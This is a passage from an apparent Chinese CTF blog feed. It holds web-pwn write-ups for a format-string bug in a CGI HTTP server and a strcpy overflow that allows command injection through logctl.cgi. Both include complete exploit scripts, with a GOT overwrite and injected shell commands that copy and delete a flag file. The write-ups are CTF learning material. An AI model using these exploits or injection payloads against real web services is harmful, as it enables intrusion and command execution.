                     data-src="/blog/2024/09/21/webpwn/image-20240921212523016.png"
                      class=""
                >
<p>此时就能不报上述错误继续调试，其实这里我在执行memcpy时rsi指针末位还是f，并没有对齐。这时可能就是原来rsi+rdx-0x40，也就是rsi+0x40这个地址已经越过了环境变量段，是一个不能访问的地址。而调换顺序后rsi+0x40仍然在环境变量这个可访问的地址当中。误打误撞也算是能够过了。（很有意思的是，gdb调试中可以继续，然而执行脚本的主程序的显示却是早早退出，显示403，但只要能够调试就行）。</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>为了方便起见，一开始可以直接在print函数上打断点,这样一进去执行一下就能看到格式化字符串漏洞的执行效果。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set env REQUEST_METHOD GET</span></span><br><span class="line"><span class="string">        set env SCRIPT_NAME /cgi-bin/note_handle%72</span></span><br><span class="line"><span class="string">        set env QUERY_STRING <span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">        set env HTTP_X_FORWARDED_FOR 127.0.0.1</span></span><br><span class="line"><span class="string">        b getenv</span></span><br><span class="line"><span class="string">        r</span></span><br><span class="line"><span class="string">        delete break 1</span></span><br><span class="line"><span class="string">        b *(0x000000000401C7A)</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>经过调试我们可以确定，我们控制的content中的内容偏移为10。（用AAAAAAAA%10$p测得）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212555410.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212614557.png"
                      class=""
                >
<p>之后修改puts的got表为system就行。</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for pwn exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC = <span class="number">1</span></span><br><span class="line">REMOTE = <span class="number">0</span></span><br><span class="line">elf_path = <span class="string">&#x27;./http&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">code = ELF(elf_path)</span><br><span class="line">context.arch=code.arch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">uu32    = <span class="keyword">lambda</span>: u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>,drop=<span class="literal">False</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>:u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,drop=<span class="literal">False</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s:io.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to  c0ke&#x27;s simplified pwntools template!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage : \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;       python mode.py HOST PORT\n &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;       python mode.py [0/1][debug]]\n &quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv)==<span class="number">2</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(sys.argv[<span class="number">1</span>]== <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        LOCAL = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LOCAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    REMOTE = <span class="number">1</span></span><br><span class="line">    server_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    server_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------func-----------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    <span class="keyword">if</span> (LOCAL):</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *0x0000000000401806</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    li(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_flag</span>():</span><br><span class="line">    flag_header = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    ru(flag_header)</span><br><span class="line">    flag = flag_header + ru(<span class="string">&#x27;&#125;&#x27;</span>) + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------exploit--------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">    code = <span class="string">&#x27;cp /start.sh /tmp/flag&#x27;</span></span><br><span class="line">    code = code + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    code = code.ljust(<span class="number">30</span>, <span class="string">&#x27;a&#x27;</span>) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">                                                                            </span><br><span class="line">    request = <span class="string">&quot;GET /cgi-bin/note_handle%2572?action=add,print,get_flag&amp;content=&#123;&#125;\(@@%30$c%30$c%30$c%30$c%30$c%136c%14$hhn HTTP/1.1\r\n&quot;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    request += <span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Cache-Control: max-age=0\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Upgrade-Insecure-Requests: 1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;X-Forwarded-For: 127.0.0.1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Encoding: gzip, deflate\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Language: zh-CN,zh;q=0.9\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;If-Modified-Since: Mon, 08 Jul 2024 04:01:37 GMT\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    db()</span><br><span class="line">    li(<span class="string">&quot;request  --------------&gt;\n%s&quot;</span>%request)</span><br><span class="line">    s(request.encode())</span><br><span class="line">    response = r(<span class="number">0x2000</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finish</span>():</span><br><span class="line">    ia()</span><br><span class="line">    c()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> REMOTE:</span><br><span class="line">        io = remote(server_ip, server_port)</span><br><span class="line">        <span class="keyword">if</span> LIBC:</span><br><span class="line">            libc = ELF(libc_path)</span><br><span class="line">        elf = ELF(elf_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        elf = ELF(elf_path)</span><br><span class="line">        <span class="keyword">if</span> LIBC:</span><br><span class="line">            libc = ELF(libc_path)</span><br><span class="line">            io = elf.process()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = elf.process()</span><br><span class="line"></span><br><span class="line">    exploit()</span><br><span class="line">    finish()</span><br></pre></td></tr></table></figure></div>
<h3 id="2-desktop"><a href="#2-desktop" class="headerlink" title="2.desktop"></a>2.desktop</h3><h4 id="xinetd信息"><a href="#xinetd信息" class="headerlink" title="xinetd信息"></a>xinetd信息</h4><p><code>xinetd</code> 配置文件是用于配置和管理 <code>xinetd</code> 服务的文件。<code>xinetd</code>（Extended Internet Service Daemon）是一个超级服务器守护进程，用于管理和启动各种 Internet 服务（如 FTP、Telnet 等），它可以监听指定的端口并在有连接请求时启动相应的服务。</p>
<h5 id="xinetd配置文件的主要类型"><a href="#xinetd配置文件的主要类型" class="headerlink" title="xinetd配置文件的主要类型"></a>xinetd配置文件的主要类型</h5><ol>
<li><strong>主配置文件</strong> (<code>/etc/xinetd.conf</code>):<ul>
<li>这是 <code>xinetd</code> 的全局配置文件，用于设置全局选项，如日志记录、服务目录等。</li>
</ul>
</li>
<li><strong>服务配置文件</strong> (<code>/etc/xinetd.d/</code> 目录):<ul>
<li>在这个目录中，每个文件定义了一个服务的配置。这些文件可以定义服务的启动方式、端口、协议、运行环境等。我们dockerfile中就有一句COPY ./pwn.xinetd /etc/xinetd.d/pwn，将配置导进去。</li>
</ul>
</li>
</ol>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">service pwn</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">disable</span> = no</span><br><span class="line">    flags = REUSE</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    <span class="built_in">wait</span>        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = 1933</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">bind</span>        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot   </span><br><span class="line">    server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source  = 5 <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu  = 20 <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    rlimit_as  = 100M <span class="comment"># the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 8:50-17:10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="相关设置解释"><a href="#相关设置解释" class="headerlink" title="相关设置解释"></a>相关设置解释</h5><p><strong><code>disable = no</code></strong>:</p>
<ul>
<li>表示该服务是启用的。</li>
</ul>
<p><strong><code>flags = REUSE</code></strong>:</p>
<ul>
<li>允许重用端口，使得服务能够在连接关闭后快速重新绑定端口。</li>
</ul>
<p><strong><code>socket_type = stream</code></strong>:</p>
<ul>
<li>指定服务使用流套接字（即 TCP），用于可靠的双向通信。</li>
</ul>
<p><strong><code>protocol = tcp</code></strong>:</p>
<ul>
<li>指定使用 TCP 协议。</li>
</ul>
<p><strong><code>wait = no</code></strong>:</p>
<ul>
<li>指定服务不等待新连接，而是立即返回并处理新的连接请求。</li>
</ul>
<p><strong><code>user = root</code></strong>:</p>
<ul>
<li>指定服务以 root 用户身份运行。这意味着服务将具有系统上最高权限，因此需要小心安全设置。</li>
</ul>
<p><strong><code>type = UNLISTED</code></strong>:</p>
<ul>
<li>表示服务不是标准服务（即不在服务列表中）。</li>
</ul>
<p><strong><code>port = 1933</code></strong>:</p>
<ul>
<li>指定服务监听的端口是 1933。我们就是把主机端口映射到这个端口。</li>
</ul>
<p><strong><code>bind = 0.0.0.0</code></strong>:</p>
<ul>
<li>表示服务绑定在所有网络接口上，允许来自任何 IP 地址的连接。</li>
</ul>
<p><strong><code>server = /usr/sbin/chroot</code></strong>:</p>
<ul>
<li>指定用于运行服务的命令。在这里，<code>chroot</code> 用于创建一个新的根文件系统环境，以限制服务的访问范围。</li>
</ul>
<p><strong><code>server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</code></strong>:</p>
<ul>
<li><code>--userspec=1000:1000</code>：指定以用户 ID 1000 和组 ID 1000 的权限运行 <code>pwn</code> 程序。根据配置，用户 ID 1000 可能是 <code>pwn</code> 用户。</li>
<li><code>/home/pwn</code>：指定 <code>chroot</code> 环境的根目录。</li>
<li><code>./pwn</code>：指定要执行的二进制文件 <code>pwn</code>。这个路径相对于 <code>/home/pwn</code>。</li>
<li><code>/var/www/html</code>：<code>pwn</code> 程序的参数，可能是 Web 服务器的根目录或其他服务相关目录。</li>
<li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>，忽略错误信息。</li>
</ul>
<p><strong><code>per_source = 5</code></strong>:</p>
<ul>
<li>限制每个源 IP 地址可以启动的服务实例数量为 5 个。</li>
</ul>
<p><strong><code>rlimit_cpu = 20</code></strong>:</p>
<ul>
<li>限制服务可以使用的最大 CPU 时间为 20 秒。</li>
</ul>
<p><strong><code>rlimit_as = 100M</code></strong>:</p>
<ul>
<li>限制服务使用的最大地址空间为 100 MB。</li>
</ul>
<p><strong><code>access_times = 8:50-17:10</code></strong>（注释掉了）:</p>
<ul>
<li>如果启用，限制服务的访问时间。</li>
</ul>
<h4 id="环境搭建踩坑"><a href="#环境搭建踩坑" class="headerlink" title="环境搭建踩坑"></a>环境搭建踩坑</h4><p>这里题目给出的镜像如果直接build的话可能会有以下报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212642490.png"
                      class=""
                >
<p>解决方法可以是在dockerfile中手动把requests的版本指定好，我本地requests==2.21.0可以成功构建。</p>
<p>然后IDA调试中，其中上面设置的信息的路径是容器中的路径，然后我用主机的6666端口映射到容器中gdbserver的默认端口</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212651224.png"
                      class=""
                >
<p>之后patch时除了patch出一个死循环以外，还要把alarm给nop掉，不然会很快退出。</p>
<p>之后要curl连的时候注意在容器中用的端口是它虚拟的端口，而不是主机映射的端口。（这里我把主机1337映射到容器1933端口）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212700543.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212709096.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212717324.png"
                      class=""
                >
<p>然后把死循环跳转改回来就可以继续调试了。这种方法也可以用于上一题的调试。</p>
<h4 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h4><p>前面的一些检测正常发包是不会被卡住的，除非curl时手动加上的X-Forwarded-For长度或格式不对。</p>
<p>main函数主要逻辑在这里，其中会从Cgi表中逐个匹配我们所请求的资源名，如果匹配上就检测X-Forwarded-For的值是否为192.168.1.x(x&lt;=20)，这里dest全局变量就是存着X-Forwarded-For的值。v21是’?’后面的get请求参数，必须要有。v22是ring_token参数，也必须被设置。之后会调用对应的cgi函数。题目中的cgi函数有那么几个：login.cgi，logout.cgi，wifictl.cgi，logctl.cgi。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212726642.png"
                      class=""
                >
<p>然后我们查看函数表，发现里面有popen危险函数，然后看交叉引用就能找到logctl的具体实现。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212734273.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212742727.png"
                      class=""
                >
<p>然后就能看到其具体实现，我们的目标就很明确了，想办法实现command的任意控制。</p>
<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>这里sscanf函数没见过，查一下是可以以一个格式化字符串匹配，然后把第一个参数分割成若干块存在后面的参数中。</p>
<p><code>%[^:]</code>表示匹配直到遇到下一个冒号为止的所有字符，并将它们存储在第二个参数指定的字符数组中。</p>
<p>首先得绕过logctl函数中前面两个判断，token的格式必须为 <code>数字:数字</code>，然后：前面的数字会和两个值进行比较，要在范围外才能过。那么我们继续看交叉引用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212751018.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212759252.png"
                      class=""
                >
<p>发现是一个时间值，而且如果调用wifictl会把这个值打印出来。那么只要先访问这个cgi，就可以得到time的值，而另一端边界值固定为0x3c，那么我们设置token前半部分为time+1就行。</p>
<p>之后发现command的值与v5有关，sub_402CAC这个函数会获取特殊字符，而前面的ban_char函数则是漏洞所在点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212812164.png"
                      class=""
                >
<p>主体逻辑是判断是否有v12中存的非法字符，我们通过logctl本体中<code>echo no support char is %s &gt; /var/www/blockingString</code>就能猜测这个逻辑。但是strcpy(s,a2)没有长度限制，可以溢出写v14，最后又会把v14写回a3，也就是v5，就实现了对command的控制。a2就是我们get传的参数值，上面会进行遍历参数键值对，所以我们用哪个参数触发漏洞都行。</p>
<p>之后就能直接打了，由于是与web服务器交互，所以要用request库进行exp编写。这里我也懒得再写一份exp了，直接用提供的exp，改个端口，能正常获取flag。</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> url[<span class="built_in">len</span>(url) - <span class="number">1</span>] != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target URL Format Error,The last char in url must be &#x27;/&#x27;.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Forword-For&#x27;</span>: <span class="string">&#x27;192.168.1.1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(&quot;[+] login...&quot;)</span></span><br><span class="line">        ret = s.get(<span class="string">&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;</span>.<span class="built_in">format</span>(url), headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;now time is&quot;</span> <span class="keyword">in</span> ret.content.decode():</span><br><span class="line">                time_ret = re.search(<span class="string">r&quot;now time is (.+?)\.\n&quot;</span>,ret.content.decode())</span><br><span class="line">                <span class="keyword">if</span> time_ret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] time_ret re error, cannot get time&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    now_time = time_ret.group(<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] now time is &quot;</span> + now_time)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] time_ret re error, cannot get time&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot get time&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        cmd = <span class="string">&quot;a;&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">1311</span> + <span class="string">&quot;cat /flag &gt;/var/www/html/flag;&quot;</span>       </span><br><span class="line">        new_url = <span class="string">&quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, <span class="built_in">int</span>(now_time)+<span class="number">1</span>, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        ret = s.get(<span class="string">&quot;&#123;&#125;flag&quot;</span>.<span class="built_in">format</span>(url), headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(ret.content.decode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot get flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        cmd = <span class="string">&quot;a;&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">1311</span> + <span class="string">&quot;rm /var/www/html/flag;&quot;</span></span><br><span class="line">        new_url = <span class="string">&quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, <span class="built_in">int</span>(now_time)+<span class="number">1</span>, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot rm flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;timed&#x27;</span> <span class="keyword">in</span> <span class="built_in">repr</span>(reason) <span class="keyword">or</span> <span class="string">&#x27;timeout&#x27;</span> <span class="keyword">in</span> <span class="built_in">repr</span>(reason):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Fail, can not connect target for: timeout&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Fail, can not connect target for: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">repr</span>(reason)))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(<span class="string">&quot;http://127.0.0.1:1337/&quot;</span>)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>带符号调试-gdb脚本实现自动化加载</title>
    <url>/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="问题由来"><a href="#问题由来" class="headerlink" title="问题由来"></a>问题由来</h4><p>在对于堆的<code>_IO_FILE</code>利用的学习过程中，我们通常需要伪造一个fake_IO_FILE，并且附带源码调试，以方便清除是否进入了目标函数，是否一些条件判断通过。但是有时候却在pwndbg加载时找不到对应的glibc的symbol file文件，这就导致我们无法进行源码级别调试，而且看结构体只能自己一个一个字段带进去看，十分麻烦。所以这里介绍一下如何方便地进行带符号调试。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103232492.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103325230.png"
                      class=""
                >
<h4 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h4><h5 id="Build-ID"><a href="#Build-ID" class="headerlink" title="Build ID"></a>Build ID</h5><p><code>Build ID</code> 是 ELF 文件（可执行文件和共享库）中一个独特的标识符，用于标识文件的内容。它是一个不可变的标志，通常用来快速匹配文件与其调试符号或源代码。</p>
<hr>
<h6 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a><strong>主要用途</strong></h6><ol>
<li><strong>唯一标识 ELF 文件</strong>：<ul>
<li>即使文件名或路径改变，<code>Build ID</code> 仍然可以唯一标识文件。</li>
<li>不同编译选项或源代码的修改会导致新的 <code>Build ID</code>。</li>
</ul>
</li>
<li><strong>关联调试符号和源代码</strong>：<ul>
<li>调试符号文件（如 <code>.debug</code> 文件）通常使用 <code>Build ID</code> 来匹配对应的 ELF 文件。</li>
</ul>
</li>
<li><strong>软件包管理和安全检查</strong>：<ul>
